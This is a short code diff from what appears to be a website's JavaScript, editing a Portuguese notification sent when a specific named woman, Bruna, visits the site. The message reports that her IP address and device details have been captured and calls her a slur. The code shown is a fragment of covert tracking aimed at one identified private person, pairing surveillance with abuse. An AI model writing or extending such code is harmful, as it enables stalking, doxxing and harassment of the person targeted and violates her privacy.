@@ -107,7 +107,7 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
 async function sendMessage(ip) {
     const device = getDeviceInfo();
     
-    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (Vou ter que testar dnv essa desgraça (ela pode entrar na hora do teste))\n\n` +
+    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; PRONTO DESGRAÇA, AGORA PAREI DE TESTAR, DEIXA A PUTA ENTRAR\n\n` +
                     `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                     `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                     `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
